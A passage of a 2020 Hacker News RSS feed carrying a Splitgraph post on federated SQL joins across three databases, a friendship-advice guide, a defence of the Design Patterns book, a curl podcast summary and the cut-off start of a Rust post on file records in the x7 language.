</code></pre><p>This creates a table that proxies to the data dumped by our GitHub star scraper.</p><p>Adding our PostgreSQL database was easy. We made an analytics user and gave it access a limited amount of useful tables (we wrote about our <a href="https://www.splitgraph.com/blog/integration-tests" as="https://www.splitgraph.com/blog/integration-tests">configuration and credential generation</a> before):</p><pre><code>sgr mount postgres_fdw sgr_auth -c [connstr] -o@- &lt;&lt;EOF
{
  "dbname": "auth",
  "remote_schema": "sgr_auth",
  "tables": [
    "user_emails",
    "profiles"
  ],
  "extra_server_args": {
    "use_remote_estimate": "true",
    "fetch_size": "10000"
  }
}
EOF
</code></pre></section><section><h2 id="sample-queries">Sample queries</h2><p>Let's now query Elasticsearch from Splitgraph and find out how many GitHub stars Splitgraph has:</p><pre><code metastring=""><span>SELECT</span> <span>"sg.github.stars"</span>
<span>FROM</span> elasticsearch_raw<span>.</span>github_scraper_data
<span>ORDER</span> <span>BY</span> <span>"@timestamp"</span> <span>DESC</span>
<span>LIMIT</span> <span>1</span><span>;</span>

 sg<span>.</span>github<span>.</span>stars

             <span>149</span>
<span>(</span><span>1</span> <span>row</span><span>)</span>
</code></pre><p>Only 149?! Make sure to <a href="https://github.com/splitgraph/splitgraph" as="https://github.com/splitgraph/splitgraph">star Splitgraph on GitHub</a> if you're reading this!</p><section><h3 id="federated-join">Federated JOIN</h3><p>As a real-world example, let's say we wanted to:</p><ul><li>Find users that visited our website in the last week</li><li>Also find out how many queries to our Data Delivery Network they made</li><li>Find out their e-mail addresses</li></ul><p>This data lives across three different databases, as discussed. With this setup, we can bring these three silos together with one simple SQL query:</p><pre><code metastring=""><span>SELECT</span>
    v<span>.</span>user_id<span>,</span>
    email<span>,</span>
    last_visit<span>,</span>
    <span>COALESCE</span><span>(</span>total_ddn_queries<span>,</span> <span>0</span><span>)</span> <span>AS</span> total_ddn_queries
<span>FROM</span> sgr_auth<span>.</span>user_emails ue
<span>LEFT</span> <span>OUTER</span> <span>JOIN</span> <span>(</span>
    
    <span>SELECT</span> <span>"sg.api.user_id"</span> <span>AS</span> user_id<span>,</span> <span>COUNT</span><span>(</span><span>1</span><span>)</span> <span>AS</span> total_ddn_queries
    <span>FROM</span> elasticsearch_raw<span>.</span>sql_api_queries
    <span>WHERE</span> <span>"sg.sql.used_images"</span> <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> d
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> d<span>.</span>user_id
<span>JOIN</span> <span>(</span>
    
    
    <span>SELECT</span> user_id<span>,</span> <span>MAX</span><span>(</span>visit_last_action_time<span>)</span> <span>AS</span> last_visit
    <span>FROM</span> matomo_raw<span>.</span>matomo_log_visit v
    <span>WHERE</span> user_id <span>IS</span> <span>NOT</span> <span>NULL</span>
    <span>AND</span> AGE<span>(</span>visit_last_action_time<span>)</span> <span>&lt;</span> <span>'1 week'</span>
    <span>GROUP</span> <span>BY</span> user_id
<span>)</span> v
<span>ON</span> ue<span>.</span>user_id::<span>text</span> <span>=</span> v<span>.</span>user_id
<span>WHERE</span> ue<span>.</span>is_primary <span>IS</span> <span>TRUE</span>
<span>ORDER</span> <span>BY</span> last_visit <span>DESC</span><span>;</span>
</code></pre><p>Here's the query plan for it:</p><pre><code> Sort
   Sort Key: (max(v.visit_last_action_time)) DESC
   -&gt;  Hash Left Join
         Hash Cond: ((ue.user_id)::text = d.user_id)
         -&gt;  Hash Join
               Hash Cond: ((ue.user_id)::text = (v.user_id)::text)
               -&gt;  Foreign Scan on user_emails ue
                     Filter: (is_primary IS TRUE)
               -&gt;  Hash
                     -&gt;  HashAggregate
                           Group Key: v.user_id
                           -&gt;  Foreign Scan on matomo_log_visit v
                                 Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)
         -&gt;  Hash
               -&gt;  Subquery Scan on d
                     -&gt;  GroupAggregate
                           Group Key: sql_api_queries."sg.api.user_id"
                           -&gt;  Sort
                                 Sort Key: sql_api_queries."sg.api.user_id"
                                 -&gt;  Foreign Scan on sql_api_queries
                                       Filter: ("sg.sql.used_images" IS NOT NULL)
                                       Multicorn: Elasticsearch query to &lt;Elasticsearch([{'host': 'elasticsearch', 'port': 9200}])&gt;
                                       Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>As you can see, this resolves into a Hash Join across three foreign tables. It also pushes down most of the clauses to the three origin databases:</p><pre><code>[PostgreSQL]
Foreign Scan on user_emails ue
  Filter: (is_primary IS TRUE)

[MySQL]
Foreign Scan on matomo_log_visit v
  Filter: (age((CURRENT_DATE)::timestamp without time zone, visit_last_action_time) &lt; '7 days'::interval)

[Elasticsearch]
-&gt;  Foreign Scan on sql_api_queries
  Filter: ("sg.sql.used_images" IS NOT NULL)
  Multicorn: Query: {"query": {"bool": {"must": [{"exists": {"field": "sg.sql.used_images"}}]}}}
</code></pre><p>Normally, this would require a data warehouse and a few separate ingestion pipelines. With Splitgraph and PostgreSQL, we can query the data at source. This idea is called "data virtualization" or a "data fabric". We call it a "database proxy".</p><p>Is data virtualization always the right solution? No, but it should be a starting point. If performance becomes a concern, we'll be able to snapshot these tables as Splitgraph images. Splitgraph stores data in a columnar format (using
<a href="https://www.splitgraph.com/docs/concepts/objects" as="https://www.splitgraph.com/docs/concepts/objects"><code>cstore_fdw</code></a>), so we'll be able to query it much faster.</p></section></section><section><h2 id="data-modelling">Data modelling</h2><p>We wrote a few views on these source foreign tables that wrangle the data and clean it up. For example (<a href="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql" as="https://github.com/splitgraph/splitgraph/blob/master/examples/cross-db-analytics/mounting/matomo.sql">SQL on GitHub</a>),‚Ä¶</p></section></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</a></em></p>]]>
            </description>
            <link>https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515353</guid>
            <pubDate>Fri, 18 Sep 2020 11:20:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Make Friends as an Adult]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24515221">thread link</a>) | @Parth86
<br/>
September 18, 2020 | https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>Friends are a treasure. In an uncertain world, they provide a comforting sense of stability and connection. We laugh together and cry together, sharing our good times and supporting each other through the bad. Yet a defining feature of friendship is that it√¢‚Ç¨‚Ñ¢s voluntary. We√¢‚Ç¨‚Ñ¢re not wedded together by law, or through blood, or via monthly payments into our bank accounts. It is a relationship of great freedom, one that we retain only because we want to.</p>
<p>But the downside of all this freedom, this lack of formal commitment, is that friendship often falls by the wayside. Our adult lives can become a monsoon of obligations, from children, to partners, to ailing parents, to work hours that trespass on our free time. A <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Febs0000046">study</a> of young adults√¢‚Ç¨‚Ñ¢ social networks by researchers at the University of Oxford found that those in a romantic relationship had, on average, two fewer close social ties, including friends. Those with kids had lost out even more. Friendships crumble, not because of any deliberate decision to let them go, but because we have other priorities, ones that aren√¢‚Ç¨‚Ñ¢t quite as voluntary. The title of the Oxford paper summed up things well: √¢‚Ç¨ÀúRomance and Reproduction Are Socially Costly√¢‚Ç¨‚Ñ¢.</p>
<p>Such is the pace and busyness of many people√¢‚Ç¨‚Ñ¢s adult lives that they can lose contact with their friends at a rapid rate. For instance, a <a href="https://www.sciencedirect.com/science/article/pii/S0378873313001056?via%3Dihub">study</a> by the Dutch sociologist Gerald Mollenhorst found that, over a period of seven years, people had lost touch with half of their closest friends, on average. What√¢‚Ç¨‚Ñ¢s especially alarming is that many of us seem to be losing friends faster than we can replace them. A <a href="https://psycnet.apa.org/record/2012-13785-001">meta-analysis</a> by researchers in Germany published in 2013 combined data from 177,635 participants across 277 studies, concluding that friendship networks had been shrinking for the preceding 35 years. For example, in studies conducted between 1980 and 1985, participants reportedly had four more friends on average, compared with the participants who√¢‚Ç¨‚Ñ¢d taken part in studies between 2000 and 2005.</p>
<p>If we√¢‚Ç¨‚Ñ¢re not careful, we risk living out our adulthoods friendless. This is a situation that√¢‚Ç¨‚Ñ¢s worth avoiding. Friends are not only a great source of fun and <a href="https://www.pewforum.org/2018/11/20/where-americans-find-meaning-in-life/">meaning</a> in life, but studies <a href="https://academic.oup.com/psychsocgerontology/article/74/2/222/3760165">suggest</a> that, without them, we√¢‚Ç¨‚Ñ¢re also at greater risk of feeling more depressed. It√¢‚Ç¨‚Ñ¢s telling that in their <a href="https://journals.sagepub.com/doi/10.1111/1467-9280.00415">study</a> √¢‚Ç¨ÀúVery Happy People√¢‚Ç¨‚Ñ¢ (2002), the American psychologists Ed Diener and Martin Seligman found that a key difference between the most unhappy and most happy people was how socially connected they were. Friends give us so much, which is why we need to invest in making them. Here√¢‚Ç¨‚Ñ¢s how.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>Making more friends in adulthood is going to take some deliberate effort on your part. It√¢‚Ç¨‚Ñ¢s an exciting challenge in theory, but one of the first obstacles you√¢‚Ç¨‚Ñ¢ll encounter is having enough confidence. Especially if you are shy by nature, putting yourself out there can seem scary, triggering fears of rejection. These fears might lead you to engage in two types of avoidance that will inhibit your ability to make friends. First, you might practise √¢‚Ç¨Àúovert avoidance√¢‚Ç¨‚Ñ¢, by not putting yourself in situations where it√¢‚Ç¨‚Ñ¢s possible to meet new people. Instead of going to your friend√¢‚Ç¨‚Ñ¢s movie night, with the chance to meet others, you end up staying at home. Second, you might find yourself engaging in √¢‚Ç¨Àúcovert avoidance√¢‚Ç¨‚Ñ¢, which means that you show up but don√¢‚Ç¨‚Ñ¢t engage with people when you arrive. You go to the movie night, but while everyone else is analysing the film after it√¢‚Ç¨‚Ñ¢s over, you stay silent in the corner, petting someone√¢‚Ç¨‚Ñ¢s pet corgi and scrolling through Instagram.</p>
<p><strong>Assume that people like you</strong></p>
<p>Both these forms of avoidance are caused by understandable fears of rejection. So imagine how much easier it would be if you knew that, were you to show up in a group of strangers, most of them would love you and find you interesting. This mindset actually has a self-fulfilling quality √¢‚Ç¨‚Äú an American <a href="https://doi.apa.org/doiLanding?doi=10.1037%2F0022-3514.51.2.284">study</a> from the 1980s found that volunteers who were led to believe that an interaction partner liked them began to act in ways that made this belief more likely to come true √¢‚Ç¨‚Äú they shared more about themselves, disagreed less, and had a more positive attitude. This suggests that if you go into social situations with a positive mindset, assuming people like you, then it√¢‚Ç¨‚Ñ¢s more likely that this will actually turn out to be the case.</p>
<p>Of course, you might still be reluctant to assume others like you because you don√¢‚Ç¨‚Ñ¢t believe it√¢‚Ç¨‚Ñ¢s true. If this is you, you might take comfort from research that found, on average, that strangers like us more than we realise. The <a href="https://journals.sagepub.com/doi/10.1177/0956797618783714">paper</a>, by Erica J Boothby at Cornell University and colleagues, involved having pairs of strangers chat together for five minutes, to rate how much they liked their interaction partner, and to estimate how much their partner liked them. Across a variety of settings and study durations √¢‚Ç¨‚Äú in the lab, in a college dorm, at a professional development workshop √¢‚Ç¨‚Äú the same pattern emerged. People underestimated how much they were liked, a phenomenon that Boothby and her colleagues labelled √¢‚Ç¨Àúthe liking gap√¢‚Ç¨‚Ñ¢.</p>
<p>What wisdom should we take from this research? It can remind us to go into new social events assuming that people will like us. It can keep us from being paralysed by fears of rejection, pushing us to question some of these fears. Try working on your internal dialogue, your inner voice that perhaps makes overly negative assumptions about how people will respond to you. Doing this will help give you the confidence to go out there and start initiating friendly contact with strangers.</p>
<p><strong>Initiate</strong></p>
<p>In <em>We Should Get Together: The Secret to Cultivating Better Friendships</em> (2020), Kat Vellos describes being inspired to write her book after a moment of feeling utterly alone. She was looking for a friend to hang out with, so she posted on Facebook: √¢‚Ç¨ÀúWho wants to go eat French fries and talk about life with me?√¢‚Ç¨‚Ñ¢ Everyone who responded lived in another state; her local San Francisco Bay Area friends were all booked up. As she put it:</p>
<blockquote>I didn√¢‚Ç¨‚Ñ¢t just want to eat snacks and talk about life. I was craving a different kind of life √¢‚Ç¨‚Äú one that would give me abundant access to friends who wanted to see me as much as I wanted to see them.</blockquote>
<p>This experience made Vellos realise that she needed more friends, so she created and executed a plan to make some. Eventually, she was running two successful meetup groups, and had established friendships with people she liked and wanted to get closer to. How did she change her life? She initiated. Vellos set aside time to reach out to people regularly, to revitalise old relationships and to awaken new ones, to check in, to find time to hang out. Her story reveals how initiative can change the course of our friendships.</p>
<p>To embrace the importance of initiating, you must to let go of the myth that friendship happens organically. You have to take responsibility rather than waiting passively. Science backs this up. Consider a <a href="https://journals.sagepub.com/doi/pdf/10.1177/0265407509106718">study</a> of older adults in the Canadian province of Manitoba. The participants who thought friendship was something that just happened based on luck tended to be less socially active and to feel lonelier when the researchers caught up with them five years later. By contrast, those who thought friendship took effort actually made more effort √¢‚Ç¨‚Äú for example, by showing up at church or at community groups √¢‚Ç¨‚Äú and this paid dividends, in that they felt less lonely at the five-year follow-up.</p>
<p>But it√¢‚Ç¨‚Ñ¢s not just showing up that matters, it√¢‚Ç¨‚Ñ¢s saying √¢‚Ç¨Àúhello√¢‚Ç¨‚Ñ¢ when you get there. This means introducing yourself to other people, asking them for their phone numbers, following up and asking them to hang out. Initiating is a process, one that we must do over and over again to make new friendships.</p>
<p>Initiation is particularly important for people who find themselves in new social settings √¢‚Ç¨‚Äú such as people who have moved to a new city, started a new school or job. In a <a href="https://psycnet.apa.org/record/1987-97266-009">study</a> of first-year undergraduates at the University of Denver in 1980, it was those students who rated themselves as having superior social skills who managed to develop more satisfying social relationships. Moreover, in the Fall, when everyone was new, it was specifically √¢‚Ç¨Àúinitiation skill√¢‚Ç¨‚Ñ¢ that was most important. Once friendships were more stable, it didn√¢‚Ç¨‚Ñ¢t matter as much.</p>
<p>Although we might fear that other people will turn us down if we initiate with them, the research finds that this is a lot less likely than we might think. When the American psychologists Nicholas Epley and Juliana Schroeder <a href="https://psycnet.apa.org/record/2014-28833-001">asked</a> research participants to open up conversations with their fellow train commuters, can you guess how many of them were shot down? None! Epley and Schroder concluded that: √¢‚Ç¨ÀúCommuters appeared to think that talking to a stranger posed a meaningful risk of social rejection. As far as we can tell, it posed no risk at all.√¢‚Ç¨‚Ñ¢</p>
<p><strong>Keep showing up</strong></p>
<p>Once you√¢‚Ç¨‚Ñ¢ve initiated some new contacts, the challenge of turning them into genuine friendships begins. I learned this lesson when I moved to Atlanta to start a job as assistant professor. At first, I was proactive at making friends. I showed up to events, asked my friends if they knew anyone in the area, and went to some meetup groups. I met a few people, but most of these friendships fizzled. I was good at sparking a connection but struggled to sustain it.</p>
<p>According to Rebecca G Adams, professor of sociology and gerontology at the University of North Carolina at Greensboro, sociologists have long <a href="https://www.nytimes.com/2012/07/15/fashion/the-challenge-of-making-friends-as-an-adult.html">recognised</a> that friendships thrive when we have continuous interaction. My problem with sustaining connection was that I lacked the opportunity for repeated encounters. Going to a lecture, or a happy hour, or a networking event afforded me only one opportunity to connect. If you can, it√¢‚Ç¨‚Ñ¢s a better idea to sign up for activities that give you multiple opportunities to connect, such as a language class, a writing course, an ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515221</guid>
            <pubDate>Fri, 18 Sep 2020 10:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514953">thread link</a>) | @aseure
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I‚Äôll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I‚Äôm also starting to be disappointed by some of its negative aspects. While it doesn‚Äôt prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I‚Äôd like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we‚Äôll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as ‚Äúfoolish‚Äù does not end well.</p>
<p>While I disagree with the tone here, I‚Äôd like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it‚Äôs outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the ‚Äúflyweight‚Äù design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let‚Äôs get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn‚Äôt the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn‚Äôt. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let‚Äôs remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let‚Äôs not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father‚Äôs tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it‚Äôs directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don‚Äôt think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer ‚Äúcomposition over inheritance‚Äù. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you‚Äôre done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don‚Äôt see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: ‚ÄúDefine a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically‚Äù. Now, if we take a look at some modern technologies, doesn‚Äôt this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I‚Äôm not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I‚Äôm merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section ‚ÄúWhat to Expect from Design Patterns‚Äù, page 351:</p>
<blockquote>
<p>It‚Äôs possible to argue that this book hasn‚Äôt accomplished much. After all, it doesn‚Äôt present any algorithms or programming techniques that haven‚Äôt been used before. [‚Ä¶] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can‚Äôt offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don‚Äôt study design patterns in software, we won‚Äôt be able to improve them, and it‚Äôll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514953</guid>
            <pubDate>Fri, 18 Sep 2020 10:14:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security Headlines: cURL special with Daniel Stenberg [audio]]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514932">thread link</a>) | @devrustr
<br/>
September 18, 2020 | https://blog.firosolutions.com/2020/09/security-headlines-curl-special/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/09/security-headlines-curl-special/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="curl security headlines podcast" src="https://blog.firosolutions.com/shcurl.png"></p><h3 id="summary">Summary:</h3>

<p>In this episode of Security Headlines, we jump into curl with<br>
its founder and maintainer Daniel Stenberg.<br>
We talk security, CI systems, creation of curl, Fuzzing, IRC bots<br>
and a lot more!</p>

<p>Relax, Tune in and enjoy this episode of Security Headlines:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g">https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g</a></p>

<p>Few software developers never even get near to having one<br>
of their projects being picked up by a larger community.</p>

<p>A project that started as a currency plugin to an IRC bot.<br>
Spun off and ended up becoming bigger and bigger resulting in being
adopted by over 10 billion devices.  Well, this project is called<br>
curl!  Curl is known to be the stable swizz army knife that can<br>
be used for making various types of transfer requests.</p>

<p>Need to download a file? Curl is here for you<br>
Need to test a socks5 proxy? Curl is here for you<br>
Need to download an ezine over Gopher? Curl is here for you<br>
Need to test a unix socket? Curl is here for you</p>

<p>In this episode of Security Headlines, we are joined by Daniel<br>
Stenberg who is the founder and maintainer of Curl.<br>
He has even been awarded a gold medal by the Swedish king for<br>
his work with Curl.</p>



<p><img alt="curl Daniel stenberg King medal" src="https://blog.firosolutions.com/daniel-king.jpg"></p><p>The curl codebase is around 100 000 lines of C code, filled with<br>
hidden gems such as a libcurl code generator that creates a template<br>
based on the command line arguments you give it.</p>

<p>One of curl‚Äôs many features is the ‚Äìlibcurl option which<br>
takes the commmand you give curl and generate a C program that use<br>
libcurl with the same functionally, you can even port it to other<br>
programming languages with a similar syntax and use it with libcurl‚Äôs<br>
bindings.</p>

<pre><code>$ curl https://blog.firosolutions.com --libcurl example.c   
$ head example.c 
/********* Sample code generated by the curl command line tool **********
 * All curl_easy_setopt() options are documented at:
 * https://curl.haxx.se/libcurl/c/curl_easy_setopt.html
 ************************************************************************/
#include &lt;curl/curl.h&gt;

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd;

</code></pre>

<p>Even Google love Curl, having curl in over 100 devices.<br>
This leads us to Google‚Äôs fuzzing project, where they have<br>
an army of computers that feed automated generated data in order<br>
to find bugs.<br>
This has resulted in curl being more stable, secure, and mature.</p>

<p>The world is always moving and so is the technology evolution.<br>
Getting a bit dystopian here, but maybe we will move to a future<br>
where we are running everything in a browser.<br>
A world where everything runs ipv6 and http3.</p>

<p>In that world, I know one tool we can count on.</p>

<h3 id="external-links">External links:</h3>

<p><a href="https://curl.haxx.se/">https://curl.haxx.se/</a><br>
<a href="https://curl.haxx.se/docs/security.html">https://curl.haxx.se/docs/security.html</a><br>
<a href="https://en.wikipedia.org/wiki/CURL">https://en.wikipedia.org/wiki/CURL</a><br>
<a href="https://twitter.com/bagder">https://twitter.com/bagder</a><br>
<a href="https://www.wolfssl.com/">https://www.wolfssl.com/</a><br>
<a href="https://daniel.haxx.se/">https://daniel.haxx.se/</a><br>
<a href="https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl">https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl</a><br>
<a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29">https://en.wikipedia.org/wiki/Gopher_%28protocol%29</a><br>
<a href="https://curl.haxx.se/mail/">https://curl.haxx.se/mail/</a></p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/09/security-headlines-curl-special/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514932</guid>
            <pubDate>Fri, 18 Sep 2020 10:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Records in X7]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514658">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7 | <a href="https://web.archive.org/web/*/https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org2fd690a">
<p>
The original motivation for adding <code>Record</code> to <code>x7</code> is the ability to open, read, and write to files.
We'll back the <code>x7</code> File implementation by the <code>rust</code> File struct, so let's make a new file in <code>x7</code> - <code>records/file.rs</code>:
</p>
<p>
We will start by making a <code>FileRecord</code> struct:
</p>
<div>
<pre><span>#</span><span>[</span><span>derive</span><span>(</span><span>Clone, Debug</span><span>)</span><span>]</span>
<span>pub</span><span>(</span><span>crate</span><span>)</span> <span>struct</span> <span>FileRecord</span> <span>{</span>
    <span>path</span>: <span>String</span>,
    <span>// </span><span>The Record trait requires Sync + Send</span>
    <span>file</span>: <span>Arc</span><span>&lt;</span><span>Mutex</span><span>&lt;</span><span>std</span>::<span>fs</span>::<span>File</span><span>&gt;</span><span>&gt;</span>,
<span>}</span>
</pre>
</div>
<p>
The type <code>Arc&lt;Mutex&lt;std::fs::File&gt;&gt;</code> is necessary as <code>x7</code> requires all types to be thread safe.
</p>
<p>
Now that we have a struct, let's expose a way to generate one from <code>x7</code>. We want the following <code>x7</code> expression to work:
</p>

<p>
This will map to a <code>Expr::String("file-name")</code> in the interpreter, so we need two methods:
</p>
<ol>
<li>A way to open files given a <code>String</code></li>
<li>A way to open files given an <code>Expr::String</code></li>
</ol>
<p>
With that in mind, here's the two relevant methods:
</p>
<div>
<pre><span>impl</span> <span>FileRecord</span> <span>{</span>
      <span>/// Open a file with the given Path</span>
      <span>pub</span><span>(</span><span>crate</span><span>)</span> <span>fn</span> <span>open_file</span><span>(</span><span>path</span>: <span>String</span><span>)</span> -&gt; <span>LispResult</span><span>&lt;</span><span>Expr</span><span>&gt;</span> <span>{</span>
      <span>// </span><span>Open the file with liberal permissions.</span>
      <span>let</span> <span>f</span> = <span>OpenOptions</span>::new<span>()</span>
          .write<span>(</span><span>true</span><span>)</span>
          .create<span>(</span><span>true</span><span>)</span>
          .read<span>(</span><span>true</span><span>)</span>
          .open<span>(</span>path.clone<span>()</span><span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not open file \"{}\" because {}"</span>, &amp;path, e<span>)</span><span>)</span><span>?</span>;
      <span>// </span><span>Make the path pretty.</span>
      <span>let</span> <span>abs_path</span> = <span>fs</span>::canonicalize<span>(</span>path<span>)</span>
          .map_err<span>(</span>|e| <span>anyhow!</span><span>(</span><span>"Could not canonicalize path! {}"</span>, e<span>)</span><span>)</span><span>?</span>
          .to_str<span>()</span>
          .ok_or_else<span>(</span>|| <span>anyhow!</span><span>(</span><span>"Could not represent path as UTF-8 string"</span><span>)</span><span>)</span><span>?</span>
          .into<span>()</span>;
